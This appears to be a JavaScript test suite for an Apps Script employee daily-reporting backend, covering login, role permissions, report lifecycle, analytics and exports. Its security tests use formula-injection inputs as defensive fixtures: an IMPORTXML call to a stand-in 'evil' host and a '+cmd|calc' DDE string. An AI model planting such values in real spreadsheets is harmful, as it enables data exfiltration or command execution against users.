/**
 * Backend test suite. Runs the real Apps Script code in the local simulator.
 *   node tests/backend.test.js
 */
'use strict';
const { loadBackend } = require('./gas-mock.js');

let passed = 0, failed = 0;
const failures = [];
function test(name, fn) {
  try { fn(); passed++; console.log('  ok   ' + name); }
  catch (e) { failed++; failures.push(name); console.log('  FAIL ' + name + '\n       ' + (e && e.stack || e).split('\n').slice(0, 3).join('\n       ')); }
}
function eq(a, b, msg) { if (a !== b) throw new Error((msg || 'expected equal') + ': ' + JSON.stringify(a) + ' !== ' + JSON.stringify(b)); }
function ok(v, msg) { if (!v) throw new Error(msg || 'expected truthy'); }
function okRes(r, msg) { if (!r.ok) throw new Error((msg || 'request failed') + ': ' + JSON.stringify(r.error)); return r.data; }
function errRes(r, code) { if (r.ok) throw new Error('expected error ' + code + ' but request succeeded'); eq(r.error.code, code, 'error code'); return r.error; }

const b = loadBackend();
const call = b.call;
const sheet = (n) => b.state.spreadsheet.getSheetByName(n);
const rows = (n) => { const s = sheet(n); const h = s.data[0]; return s.data.slice(1).filter((l) => l[0]).map((l) => Object.fromEntries(h.map((k, i) => [k, l[i] === undefined ? '' : l[i]]))); };
const today = () => b.ctx.todayStr();
const yesterday = () => b.ctx.addDays(today(), -1);

console.log('\nSetup');
let adminUser, adminPass, adminToken;
test('setup creates sheets, defaults and the first admin', () => {
  const msg = b.run('setupOakcraftSystem');
  const m = /username: (\S+)\s+temporary password: (\S+)/.exec(msg);
  ok(m, 'admin credentials printed');
  adminUser = m[1]; adminPass = m[2];
  eq(rows('Departments').length, 8);
  ok(rows('Questions').some((q) => q.QuestionKey === 'COMMON_BLOCKER_FLAG'));
  ok(rows('Settings').length >= 25);
  eq(sheet('Employees').frozen, 1);
});
test('setup is idempotent and preserves manual columns and data', () => {
  const emp = sheet('Employees');
  const col = emp.getLastColumn() + 1;
  emp.getRange(1, col).setValues([['ManualNote']]);
  emp.getRange(2, col).setValues([['keep me']]);
  const before = rows('Questions').length;
  const msg = b.run('setupOakcraftSystem');
  ok(/no changes/.test(msg), msg);
  eq(rows('Questions').length, before);
  eq(emp.data[1][col - 1], 'keep me');
});
test('setup repairs a missing column', () => {
  const t = sheet('FollowUps');
  const idx = t.data[0].indexOf('ResolvedAt');
  t.data[0][idx] = '';
  const msg = b.run('setupOakcraftSystem');
  ok(/Added columns to FollowUps: ResolvedAt/.test(msg), msg);
  errRes(call('login', { username: 'x', password: 'y' }), 'INVALID_CREDENTIALS');
});

console.log('\nAuthentication');
test('login rejects wrong password without revealing which part is wrong', () => {
  const e = errRes(call('login', { username: adminUser, password: 'wrong-pass1' }), 'INVALID_CREDENTIALS');
  eq(e.message, 'Invalid username or password.');
});
test('first login requires a password change before any other action', () => {
  const d = okRes(call('login', { username: adminUser, password: adminPass }));
  adminToken = d.token;
  eq(d.user.mustChangePassword, true);
  errRes(call('getEmployees', {}, adminToken), 'PASSWORD_CHANGE_REQUIRED');
  okRes(call('me', {}, adminToken));
  errRes(call('changePassword', { currentPassword: adminPass, newPassword: 'short' }, adminToken), 'VALIDATION');
  okRes(call('changePassword', { currentPassword: adminPass, newPassword: 'Walnut2026' }, adminToken));
  adminPass = 'Walnut2026';
  okRes(call('getEmployees', {}, adminToken));
});
test('password hash, not the token, is stored in Sessions', () => {
  const s = rows('Sessions');
  ok(s.length > 0);
  ok(s.every((x) => x.TokenHash.length === 44 && x.TokenHash !== adminToken));
  ok(rows('Credentials').every((c) => !JSON.stringify(c).includes('Walnut2026')));
});
test('invalid and forged tokens are rejected', () => {
  errRes(call('me', {}, 'abc'), 'UNAUTHORIZED');
  errRes(call('me', {}, 'a'.repeat(64)), 'UNAUTHORIZED');
  errRes(call('me', {}, undefined), 'UNAUTHORIZED');
});
test('unknown action is rejected', () => { errRes(call('dropTables', {}, adminToken), 'NOT_FOUND'); });
test('login locks after repeated failures', () => {
  for (let i = 0; i < 5; i++) errRes(call('login', { username: 'lockme', password: 'nope12345' }), 'INVALID_CREDENTIALS');
  errRes(call('login', { username: 'lockme', password: 'nope12345' }), 'LOCKED');
});

console.log('\nEmployees & departments');
let mgrId, empId, emp2Id, outsiderId, mgrToken, empToken, emp2Token, outsiderToken;
const login = (u, p) => okRes(call('login', { username: u, password: p })).token;
test('admin creates a manager and employees with validation', () => {
  const v = errRes(call('saveEmployee', { employee: { name: '', username: 'x', departmentId: 'NOPE', email: 'bad' }, password: 'abc' }, adminToken), 'VALIDATION');
  ok(v.fieldErrors.name && v.fieldErrors.username && v.fieldErrors.departmentId && v.fieldErrors.email);
  mgrId = okRes(call('saveEmployee', { employee: { name: 'Anita Rao', departmentId: 'DEPT-SALES', designation: 'Sales Manager', role: 'MANAGER', username: 'anita', email: 'anita@oakcraft.in', mobile: '9876543210', joiningDate: '2024-01-01' }, password: 'Temp12345' }, adminToken)).employeeId;
  empId = okRes(call('saveEmployee', { employee: { name: 'Ravi Kumar', departmentId: 'DEPT-SALES', designation: 'Sales Executive', role: 'EMPLOYEE', managerId: mgrId, username: 'ravi', joiningDate: '2024-01-01' }, password: 'Temp12345' }, adminToken)).employeeId;
  emp2Id = okRes(call('saveEmployee', { employee: { name: 'Seema Das', departmentId: 'DEPT-SALES', role: 'EMPLOYEE', managerId: mgrId, username: 'seema', joiningDate: '2024-01-01' }, password: 'Temp12345' }, adminToken)).employeeId;
  outsiderId = okRes(call('saveEmployee', { employee: { name: 'Omar Store', departmentId: 'DEPT-STORE', role: 'EMPLOYEE', username: 'omar', joiningDate: '2024-01-01' }, password: 'Temp12345' }, adminToken)).employeeId;
  const dup = errRes(call('saveEmployee', { employee: { name: 'Dup', departmentId: 'DEPT-SALES', username: 'ravi' }, password: 'Temp12345' }, adminToken), 'VALIDATION');
  ok(dup.fieldErrors.username);
});
test('department manager assignment requires manager role', () => {
  const e = errRes(call('saveDepartment', { department: { departmentId: 'DEPT-SALES', name: 'SALES', managerId: empId } }, adminToken), 'VALIDATION');
  ok(e.fieldErrors.managerId);
  okRes(call('saveDepartment', { department: { departmentId: 'DEPT-SALES', name: 'SALES', managerId: mgrId } }, adminToken));
});
test('new users must change their temporary password', () => {
  const prep = (u) => { const t = login(u, 'Temp12345'); okRes(call('changePassword', { currentPassword: 'Temp12345', newPassword: 'Chair2026x' }, t)); return login(u, 'Chair2026x'); };
  mgrToken = prep('anita'); empToken = prep('ravi'); emp2Token = prep('seema'); outsiderToken = prep('omar');
});
test('role enforcement: employees cannot use management or admin APIs', () => {
  errRes(call('getEmployees', {}, empToken), 'FORBIDDEN');
  errRes(call('saveEmployee', { employee: { name: 'Hack', departmentId: 'DEPT-SALES', username: 'hack', role: 'ADMIN' }, password: 'Temp12345' }, empToken), 'FORBIDDEN');
  errRes(call('getDashboardData', {}, empToken), 'FORBIDDEN');
  errRes(call('saveSettings', { settings: { COMPANY_NAME: 'X' } }, mgrToken), 'FORBIDDEN');
  errRes(call('getAuditLogs', {}, mgrToken), 'FORBIDDEN');
  errRes(call('exportReport', { dataset: 'REPORTS' }, empToken), 'FORBIDDEN');
});
test('manager sees only own team', () => {
  const d = okRes(call('getEmployees', { pageSize: 200 }, mgrToken));
  const ids = d.items.map((e) => e.employeeId);
  ok(ids.includes(empId) && ids.includes(emp2Id) && ids.includes(mgrId));
  ok(!ids.includes(outsiderId), 'outsider hidden');
  errRes(call('getEmployee', { employeeId: outsiderId }, mgrToken), 'FORBIDDEN');
  errRes(call('getEmployee', { employeeId: emp2Id }, empToken), 'FORBIDDEN');
  okRes(call('getEmployee', {}, empToken));
});
test('admin cannot deactivate or demote themselves', () => {
  errRes(call('setEmployeeStatus', { employeeId: 'EMP-0001', status: 'Inactive' }, adminToken), 'VALIDATION');
  const me = okRes(call('getEmployee', {}, adminToken));
  errRes(call('updateEmployee', { employee: Object.assign({}, me, { role: 'EMPLOYEE' }) }, adminToken), 'VALIDATION');
});

console.log('\nQuestion builder');
let customQ;
test('admin adds a department question with validation and a condition', () => {
  const e = errRes(call('saveQuestion', { question: { text: 'Pick', type: 'DROPDOWN', departmentId: 'DEPT-SALES', options: ['One'] } }, adminToken), 'VALIDATION');
  ok(e.fieldErrors.options);
  const flag = okRes(call('getQuestions', { departmentId: 'ALL' }, adminToken)).find((q) => q.key === 'COMMON_BLOCKER_FLAG');
  customQ = okRes(call('saveQuestion', { question: { text: 'Showroom walk-ins', type: 'NUMBER', section: 'KPI', departmentId: 'DEPT-SALES', required: true, validation: { min: 0, max: 50 }, key: 'SALES_WALKINS' } }, adminToken));
  okRes(call('saveQuestion', { question: { text: 'Escalated to', type: 'SHORT_TEXT', section: 'BLOCKERS', departmentId: 'DEPT-SALES', showIf: flag.questionId + '=Yes' } }, adminToken));
  errRes(call('saveQuestion', { question: { text: 'Bad cond', type: 'SHORT_TEXT', departmentId: 'DEPT-SALES', showIf: 'QST-NOPE=Yes' } }, adminToken), 'VALIDATION');
  errRes(call('saveQuestion', { question: { text: 'Dup key', type: 'SHORT_TEXT', departmentId: 'DEPT-SALES', key: 'SALES_WALKINS' } }, adminToken), 'VALIDATION');
});
test('employees only receive common + own department questions', () => {
  const qs = okRes(call('getQuestions', {}, outsiderToken));
  ok(qs.every((q) => q.departmentId === 'ALL' || q.departmentId === 'DEPT-STORE'));
  ok(!qs.some((q) => q.questionId === customQ.questionId));
});
test('reorder and deactivate questions', () => {
  const sales = okRes(call('getQuestions', { departmentId: 'DEPT-SALES' }, adminToken));
  const ids = sales.map((q) => q.questionId).reverse();
  okRes(call('reorderQuestions', { departmentId: 'DEPT-SALES', orderedIds: ids }, adminToken));
  const again = okRes(call('getQuestions', { departmentId: 'DEPT-SALES' }, adminToken));
  eq(again.find((q) => q.questionId === ids[0]).order, 10);
  const lost = sales.find((q) => q.key === 'SALES_LOST_REASONS');
  okRes(call('updateQuestion', { question: { questionId: lost.questionId, status: 'Inactive' } }, adminToken));
  ok(!okRes(call('getQuestions', {}, empToken)).some((q) => q.questionId === lost.questionId));
});

console.log('\nDaily report lifecycle');
const answersFor = (qs, overrides) => {
  const a = {};
  qs.forEach((q) => {
    if (q.type === 'NUMBER' || q.type === 'DECIMAL') a[q.questionId] = 3;
    else if (q.type === 'YES_NO') a[q.questionId] = 'No';
    else if (q.type === 'MULTI_SELECT') a[q.questionId] = [q.options[0]];
    else if (q.type === 'DROPDOWN' || q.type === 'RADIO') a[q.questionId] = q.options[0];
    else if (q.type === 'LONG_TEXT' || q.type === 'SHORT_TEXT') a[q.questionId] = 'Handled customer calls and quotations today.';
  });
  Object.assign(a, overrides || {});
  return a;
};
let yReportTaskIds = [];
test('backdated report for yesterday (within allowed window) with open tasks', () => {
  const state = okRes(call('getTodayReport', { date: yesterday() }, empToken));
  eq(state.report.status, 'NOT STARTED');
  const qs = state.questions;
  const res = okRes(call('submitReport', {
    date: yesterday(), responses: answersFor(qs),
    tasks: [
      { clientKey: 'a', title: 'Quote for 40 chairs', status: 'PENDING', priority: 'HIGH', startTime: '10:00', endTime: '11:30' },
      { clientKey: 'b', title: 'Visit Noida office', status: 'COMPLETED', priority: 'MEDIUM', duration: 90 },
      { clientKey: 'c', title: 'Dealer payment', status: 'BLOCKED', priority: 'URGENT', remarks: 'Waiting for accounts' }
    ]
  }, empToken));
  ok(res.receipt && res.receipt.reportId);
  yReportTaskIds = res.tasks.map((t) => t.taskId);
  eq(res.tasks[0].duration, 90);
  const fus = rows('FollowUps').filter((f) => f.ReportID === res.receipt.reportId);
  eq(fus.length, 1, 'auto follow-up for urgent blocked task');
  eq(fus[0].OwnerID, mgrId);
});
test('future and too-old dates are rejected', () => {
  errRes(call('getTodayReport', { date: b.ctx.addDays(today(), 1) }, empToken), 'VALIDATION');
  errRes(call('saveDraft', { date: b.ctx.addDays(today(), -5), responses: {}, tasks: [] }, empToken), 'VALIDATION');
});
let todayState, draft;
test('carry-forward shows yesterday\'s open tasks', () => {
  todayState = okRes(call('getTodayReport', {}, empToken));
  const cf = todayState.carryForward.map((t) => t.taskId);
  ok(cf.includes(yReportTaskIds[0]) && cf.includes(yReportTaskIds[2]));
  ok(!cf.includes(yReportTaskIds[1]), 'completed task not carried');
});
test('draft saves partial data, validates types, links carried tasks', () => {
  const bad = {}; bad[customQ.questionId] = 'many';
  const e = errRes(call('saveDraft', { responses: bad, tasks: [] }, empToken), 'VALIDATION');
  ok(e.fieldErrors[customQ.questionId]);
  const partial = {}; partial[customQ.questionId] = 4;
  draft = okRes(call('saveDraft', { responses: partial, tasks: [
    { clientKey: 'k1', sourceTaskId: yReportTaskIds[0], title: 'Quote for 40 chairs', status: 'IN PROGRESS', priority: 'HIGH' },
    { clientKey: 'k2', title: '', status: 'PENDING' }
  ] }, empToken));
  eq(draft.report.status, 'DRAFT');
  ok(draft.idMap.k1 && draft.idMap.k2);
  const t = rows('Tasks').find((x) => x.TaskID === draft.idMap.k1);
  eq(t.SourceTaskID, yReportTaskIds[0]); eq(t.CarryCount, '1');
  eq(rows('Tasks').find((x) => x.TaskID === yReportTaskIds[0]).CarriedToTaskID, draft.idMap.k1);
  const again = okRes(call('getTodayReport', {}, empToken));
  ok(!again.carryForward.some((x) => x.taskId === yReportTaskIds[0]), 'linked task no longer offered');
  eq(again.responses[customQ.questionId], '4');
});
test('only one report exists per employee per day', () => {
  okRes(call('saveDraft', { responses: {}, tasks: [] }, empToken));
  eq(rows('Reports').filter((r) => r.UniqueKey === empId + '|' + today()).length, 1);
});
test('removing a carried task in the draft releases the source task', () => {
  const d = okRes(call('saveDraft', { responses: {}, tasks: [{ taskId: draft.idMap.k2, title: 'Call dealer', status: 'PENDING' }] }, empToken));
  eq(d.tasks.length, 1);
  eq(rows('Tasks').find((x) => x.TaskID === yReportTaskIds[0]).CarriedToTaskID, '');
  eq(rows('Tasks').find((x) => x.TaskID === draft.idMap.k1).Deleted, 'TRUE');
});
test('earlier open task can be completed directly (carry-forward action)', () => {
  const r = okRes(call('updateTask', { taskId: yReportTaskIds[0], status: 'COMPLETED', remarks: 'Sent quote by email' }, empToken));
  eq(r.status, 'COMPLETED');
  errRes(call('updateTask', { taskId: yReportTaskIds[2], status: 'COMPLETED' }, emp2Token), 'FORBIDDEN');
  const y = rows('Reports').find((x) => x.UniqueKey === empId + '|' + yesterday());
  eq(y.TaskCompleted, '2');
});
test('submit enforces required visible questions and task titles', () => {
  const e = errRes(call('submitReport', { responses: {}, tasks: [{ title: 'x', status: 'COMPLETED' }] }, empToken), 'VALIDATION');
  ok(Object.keys(e.fieldErrors).length > 3);
  const flag = todayState.questions.find((q) => q.key === 'COMMON_BLOCKER_FLAG');
  const detail = todayState.questions.find((q) => q.key === 'COMMON_BLOCKER_DETAIL');
  const ans = answersFor(todayState.questions); ans[flag.questionId] = 'Yes'; delete ans[detail.questionId];
  const e2 = errRes(call('submitReport', { responses: ans, tasks: [] }, empToken), 'VALIDATION');
  ok(e2.fieldErrors[detail.questionId], 'conditional required question enforced');
  const e3 = errRes(call('submitReport', { responses: answersFor(todayState.questions), tasks: [{ title: '', status: 'PENDING' }] }, empToken), 'VALIDATION');
  ok(e3.taskErrors && e3.taskErrors[0]);
});
let todayReportId;
test('submit with retry is idempotent and produces a receipt', () => {
  const flag = todayState.questions.find((q) => q.key === 'COMMON_BLOCKER_FLAG');
  const detail = todayState.questions.find((q) => q.key === 'COMMON_BLOCKER_DETAIL');
  const ans = answersFor(todayState.questions); ans[flag.questionId] = 'Yes'; ans[detail.questionId] = 'Fabric vendor delayed delivery.';
  const payload = { responses: ans, tasks: [{ taskId: draft.idMap.k2, title: 'Call dealer', status: 'COMPLETED', startTime: '09:30', endTime: '10:15' }] };
  const r1 = okRes(call('submitReport', payload, empToken, 'req-abc-12345'));
  const r2 = okRes(call('submitReport', payload, empToken, 'req-abc-12345'));
  eq(r1.receipt.reportId, r2.receipt.reportId);
  todayReportId = r1.receipt.reportId;
  const r3 = okRes(call('submitReport', payload, empToken, 'req-new-99999'));
  eq(r3.alreadySubmitted, true);
  eq(rows('FollowUps').filter((f) => f.ReportID === todayReportId && f.Source === 'BLOCKER').length, 1);
  eq(rows('Reports').find((r) => r.ReportID === todayReportId).HasBlocker, 'TRUE');
  errRes(call('saveDraft', payload, empToken), 'REPORT_LOCKED');
});
test('report detail respects permissions', () => {
  okRes(call('getReport', { reportId: todayReportId }, empToken));
  okRes(call('getReport', { reportId: todayReportId }, mgrToken));
  errRes(call('getReport', { reportId: todayReportId }, emp2Token), 'FORBIDDEN');
  errRes(call('getReport', { reportId: todayReportId }, outsiderToken), 'FORBIDDEN');
  const d = okRes(call('getReport', { reportId: todayReportId }, mgrToken));
  eq(d.permissions.canReview, true); eq(d.permissions.canReopen, false);
  ok(d.history.some((h) => h.action === 'REPORT_SUBMITTED'));
});
test('manager remark with follow-up; employee cannot review', () => {
  errRes(call('saveManagerRemark', { reportId: todayReportId, comment: 'x' }, empToken), 'FORBIDDEN');
  const e = errRes(call('saveManagerRemark', { reportId: todayReportId, comment: 'Chase vendor', followUpRequired: true }, mgrToken), 'VALIDATION');
  ok(e.fieldErrors.ownerId && e.fieldErrors.dueDate);
  const r = okRes(call('saveManagerRemark', { reportId: todayReportId, comment: 'Chase vendor today', followUpRequired: true, ownerId: empId, dueDate: today(), priority: 'HIGH' }, mgrToken));
  eq(r.report.reviewStatus, 'FOLLOW-UP REQUIRED');
  ok(r.followUpId);
  const d = okRes(call('getReport', { reportId: todayReportId }, empToken));
  eq(d.remarks.length, 1);
});
test('follow-up owner can resolve with a resolution; others cannot edit', () => {
  const list = okRes(call('getFollowUps', { filters: { mine: true } }, empToken));
  const fu = list.items.find((x) => x.source === 'REMARK');
  ok(fu);
  errRes(call('saveFollowUp', { followUp: { followUpId: fu.followUpId, status: 'RESOLVED' } }, empToken), 'VALIDATION');
  const done = okRes(call('saveFollowUp', { followUp: { followUpId: fu.followUpId, status: 'RESOLVED', resolution: 'Vendor confirmed Monday delivery', title: 'Hijacked title' } }, empToken));
  eq(done.status, 'RESOLVED'); ok(done.resolvedAt); ok(done.title !== 'Hijacked title', 'owner cannot change title');
  errRes(call('saveFollowUp', { followUp: { followUpId: fu.followUpId, status: 'OPEN' } }, emp2Token), 'FORBIDDEN');
  errRes(call('saveFollowUp', { followUp: { title: 'New', employeeId: empId } }, empToken), 'FORBIDDEN');
  errRes(call('saveFollowUp', { followUp: { title: 'Not mine', departmentId: 'DEPT-STORE' } }, mgrToken), 'VALIDATION');
});
test('admin reopens a report; employee resubmits and first submission time is kept', () => {
  errRes(call('reopenReport', { reportId: todayReportId, reason: 'x' }, mgrToken), 'FORBIDDEN');
  errRes(call('reopenReport', { reportId: todayReportId }, adminToken), 'VALIDATION');
  const first = rows('Reports').find((r) => r.ReportID === todayReportId).FirstSubmittedAt;
  eq(okRes(call('reopenReport', { reportId: todayReportId, reason: 'Missing KPI' }, adminToken)).status, 'REOPENED');
  const st = okRes(call('getTodayReport', {}, empToken));
  eq(st.canEdit, true);
  const res = okRes(call('submitReport', { responses: st.responses, tasks: st.tasks }, empToken));
  ok(res.receipt);
  eq(rows('Reports').find((r) => r.ReportID === todayReportId).FirstSubmittedAt, first);
});
test('late submissions are marked LATE', () => {
  okRes(call('saveSettings', { settings: { REPORT_DEADLINE: '00:00', GRACE_PERIOD_MINUTES: 0 } }, adminToken));
  const st = okRes(call('getTodayReport', {}, emp2Token));
  const r = okRes(call('submitReport', { responses: answersFor(st.questions), tasks: [{ title: 'Follow up leads', status: 'COMPLETED' }] }, emp2Token));
  eq(r.receipt.status, 'LATE');
  okRes(call('saveSettings', { settings: { REPORT_DEADLINE: '19:00', GRACE_PERIOD_MINUTES: 15 } }, adminToken));
});
test('lock after deadline blocks edits unless reopened', () => {
  okRes(call('saveSettings', { settings: { LOCK_AFTER_DEADLINE: true, REPORT_DEADLINE: '00:00', GRACE_PERIOD_MINUTES: 0 } }, adminToken));
  const st = okRes(call('getTodayReport', {}, outsiderToken));
  eq(st.canEdit, false);
  errRes(call('saveDraft', { responses: {}, tasks: [] }, outsiderToken), 'REPORT_LOCKED');
  okRes(call('saveSettings', { settings: { LOCK_AFTER_DEADLINE: false, REPORT_DEADLINE: '19:00', GRACE_PERIOD_MINUTES: 15 } }, adminToken));
});

console.log('\nSecurity');
test('formula-like input is stored as text, not a formula', () => {
  const st = okRes(call('getTodayReport', {}, outsiderToken));
  const work = st.questions.find((q) => q.key === 'COMMON_TODAY_WORK');
  const ans = {}; ans[work.questionId] = '=IMPORTXML("http://evil","//a")';
  okRes(call('saveDraft', { responses: ans, tasks: [{ title: '+cmd|calc', status: 'PENDING' }] }, outsiderToken));
  const resp = sheet('Responses');
  const rawCells = resp.data.flat().filter((v) => String(v).includes('IMPORTXML'));
  ok(rawCells.length === 1);
  const back = okRes(call('getTodayReport', {}, outsiderToken));
  eq(back.responses[work.questionId], '=IMPORTXML("http://evil","//a")');
  eq(back.tasks[0].title, '+cmd|calc');
});
test('settings validation rejects bad weights and keeps secrets masked', () => {
  const e = errRes(call('saveSettings', { settings: { PRODUCTIVITY_WEIGHTS: { CONSISTENCY: 50, TASK_COMPLETION: 60, KPI: 0, TIMELINESS: 0, PLANNING: 0, BLOCKER_RESOLUTION: 0 } } }, adminToken), 'VALIDATION');
  ok(e.fieldErrors.PRODUCTIVITY_WEIGHTS);
  okRes(call('saveSettings', { settings: {}, secrets: { chatWebhook: 'https://chat.googleapis.com/v1/spaces/AAA/messages?key=secretkey123' } }, adminToken));
  const s = okRes(call('getSettings', {}, adminToken));
  ok(s.secrets.chatWebhook.startsWith('••••') && !s.secrets.chatWebhook.includes('secretkey'));
  const pub = okRes(call('getSettings', {}, empToken));
  ok(!('SESSION_HOURS' in pub.settings) && !pub.secrets);
  ok(!rows('AuditLog').some((a) => a.NewValue.includes('secretkey123')));
});
test('deactivated employee sessions stop working immediately', () => {
  okRes(call('setEmployeeStatus', { employeeId: outsiderId, status: 'Inactive' }, adminToken));
  errRes(call('me', {}, outsiderToken), 'UNAUTHORIZED');
  errRes(call('login', { username: 'omar', password: 'Chair2026x' }), 'ACCOUNT_INACTIVE');
  okRes(call('setEmployeeStatus', { employeeId: outsiderId, status: 'Active' }, adminToken));
});
test('unexpected errors are logged with an id and hide internals from non-admins', () => {
  const orig = b.ctx.apiSearch;
  b.ctx.apiSearch = function () { throw new Error('secret internal detail'); };
  try {
    const e = errRes(call('search', { q: 'abc' }, empToken), 'SERVER_ERROR');
    ok(!e.details && e.errorId && !e.message.includes('secret'));
    const a = errRes(call('search', { q: 'abc' }, adminToken), 'SERVER_ERROR');
    ok(/secret internal detail/.test(a.details), 'admin sees details');
    ok(rows('ErrorLog').some((x) => x.ErrorID === e.errorId));
  } finally { b.ctx.apiSearch = orig; }
});

console.log('\nAnalytics, search & exports');
test('seed demo data and compute dashboards', () => {
  const msg = b.run('seedDemoData');
  ok(/Demo data created/.test(msg), msg);
  const at = login('demo.admin', 'Demo@1234');
  const d = okRes(call('getDashboardData', { from: b.ctx.addDays(today(), -13), to: today() }, at));
  ok(d.kpis.reportsExpected > 0 && d.kpis.reportsSubmitted > 0);
  ok(d.kpis.completionPct > 0 && d.kpis.completionPct <= 100);
  eq(d.charts.daily.length, 14);
  ok(d.charts.heatmap.rows.length > 10);
  ok(d.insights.length > 0);
  ok(d.dailySummary.departments.length >= 8);
  const sumExpected = d.charts.deptSubmission.reduce((a, x) => a + x.expected, 0);
  eq(sumExpected, d.kpis.reportsExpected, 'department totals add up');
});
test('manager dashboard is limited to their department', () => {
  const mt = login('demo.anil', 'Demo@1234');
  const d = okRes(call('getDashboardData', { from: b.ctx.addDays(today(), -6), to: today() }, mt));
  ok(d.charts.deptSubmission.every((x) => x.departmentId === 'DEPT-SALES'), JSON.stringify(d.charts.deptSubmission.map((x) => x.departmentId)));
  errRes(call('getDepartmentAnalytics', { departmentId: 'DEPT-ACCOUNTS' }, mt), 'FORBIDDEN');
  const da = okRes(call('getDepartmentAnalytics', { departmentId: 'DEPT-SALES' }, mt));
  ok(da.departmentKpis.length > 5 && da.employees.length >= 3);
});
test('employee analytics exposes a transparent score', () => {
  const pt = login('demo.priya', 'Demo@1234');
  const a = okRes(call('getEmployeeAnalytics', {}, pt));
  ok(a.score && a.score.components.length === 6 && typeof a.score.score === 'number');
  const effective = a.score.components.reduce((s, c) => s + c.effectiveWeight, 0);
  ok(Math.abs(effective - 100) < 0.5, 'effective weights total 100: ' + effective);
  ok(a.score.components.every((c) => c.explanation));
  errRes(call('getEmployeeAnalytics', { employeeId: 'EMP-0001' }, pt), 'FORBIDDEN');
  const my = okRes(call('getMyDashboard', {}, pt));
  eq(my.trend.length, 8);
});
test('global search respects scope', () => {
  const at = login('demo.admin', 'Demo@1234');
  const s = okRes(call('search', { q: 'Priya' }, at));
  ok(s.employees.length >= 1 && s.reports.length >= 1);
  const et = login('ravi', 'Chair2026x');
  const s2 = okRes(call('search', { q: 'Priya' }, et));
  eq(s2.employees.length, 0); eq(s2.reports.length, 0);
  const s3 = okRes(call('search', { q: todayReportId }, et));
  eq(s3.reports.length, 1);
});
test('exports return consistent datasets', () => {
  const at = login('demo.admin', 'Demo@1234');
  const f = { from: b.ctx.addDays(today(), -7), to: today() };
  const rep = okRes(call('exportReport', { dataset: 'REPORTS', filters: f }, at));
  ok(rep.rows.length > 50 && rep.columns.some((c) => c.key === 'COMMON_TOMORROW_PLAN'));
  const kpi = okRes(call('exportReport', { dataset: 'KPI', filters: Object.assign({ departmentId: 'DEPT-SALES' }, f) }, at));
  ok(kpi.columns.length > 8);
  const tasks = okRes(call('exportReport', { dataset: 'TASKS', filters: f }, at));
  ok(tasks.rows.length > 100);
  const mt = login('demo.anil', 'Demo@1234');
  const mrep = okRes(call('exportReport', { dataset: 'TASKS', filters: f }, mt));
  ok(mrep.rows.every((r) => r.departmentId === 'DEPT-SALES'));
  ok(rows('AuditLog').some((a) => a.Action === 'DATA_EXPORTED'));
});
test('report list includes not-started rows when requested', () => {
  const at = login('demo.admin', 'Demo@1234');
  const r = okRes(call('getReports', { filters: { from: today(), to: today(), includeNotStarted: true }, pageSize: 200 }, at));
  ok(r.summary.notStarted > 0);
  eq(r.summary.total, r.total);
});

console.log('\nNotifications & scheduled jobs');
test('notifications dispatch through enabled channels only', () => {
  const before = b.state.mails.length;
  okRes(call('saveSettings', { settings: { NOTIFICATIONS_ENABLED: true, NOTIFY_CHANNELS: ['EMAIL', 'GOOGLE_CHAT'] } }, adminToken));
  okRes(call('saveFollowUp', { followUp: { title: 'Call back client', employeeId: empId, ownerId: mgrId, priority: 'HIGH', dueDate: today() } }, adminToken));
  ok(b.state.mails.length === before + 1, 'email to owner');
  ok(b.state.fetches.some((f) => f.url.includes('chat.googleapis.com')), 'chat webhook called');
  const t = okRes(call('sendTestNotification', { channels: ['WEBHOOK'] }, adminToken));
  eq(t.results[0].ok, false);
  okRes(call('installTriggers', {}, adminToken));
  eq(b.state.triggers.length, 1);
  okRes(call('installTriggers', {}, adminToken));
  eq(b.state.triggers.length, 1, 'no duplicate triggers');
  b.run('runScheduledJobs');
  okRes(call('saveSettings', { settings: { NOTIFICATIONS_ENABLED: false } }, adminToken));
});

console.log('\nRecovery');
test('manual Sheet edits apply after refresh; setup creates a new admin when none is active', () => {
  okRes(call('getEmployees', {}, adminToken)); // warms the cache
  const sh = sheet('Employees');
  const h = sh.data[0];
  sh.data.forEach((line, i) => { if (i && line[h.indexOf('Role')] === 'ADMIN') line[h.indexOf('Status')] = 'Inactive'; });
  const msg = b.run('setupOakcraftSystem');
  const m = /username: (\S+)\s+temporary password: (\S+)/.exec(msg);
  ok(m, 'new admin printed: ' + msg);
  const t = login(m[1], m[2]);
  eq(okRes(call('me', {}, t)).user.mustChangePassword, true);
  errRes(call('me', {}, adminToken), 'UNAUTHORIZED');
  sh.data.forEach((line, i) => { if (i && line[h.indexOf('EmployeeID')] === 'EMP-0001') line[h.indexOf('Status')] = 'Active'; });
  ok(/latest/.test(b.run('refreshAppCache')));
  adminToken = login(adminUser, adminPass);
  okRes(call('me', {}, adminToken));
});

console.log('\nDemo data cleanup');
test('removeDemoData removes only demo rows', () => {
  const prodReports = rows('Reports').filter((r) => r.IsDemo !== 'TRUE').length;
  const msg = b.run('removeDemoData');
  ok(/Demo data removed/.test(msg));
  eq(rows('Employees').filter((e) => e.IsDemo === 'TRUE').length, 0);
  eq(rows('Reports').length, prodReports);
  ok(rows('Employees').some((e) => e.Username === 'ravi'));
  okRes(call('me', {}, adminToken));
  errRes(call('login', { username: 'demo.admin', password: 'Demo@1234' }), 'INVALID_CREDENTIALS');
});

console.log('\n' + passed + ' passed, ' + failed + ' failed');
if (failed) { console.log('Failures:\n - ' + failures.join('\n - ')); process.exit(1); }
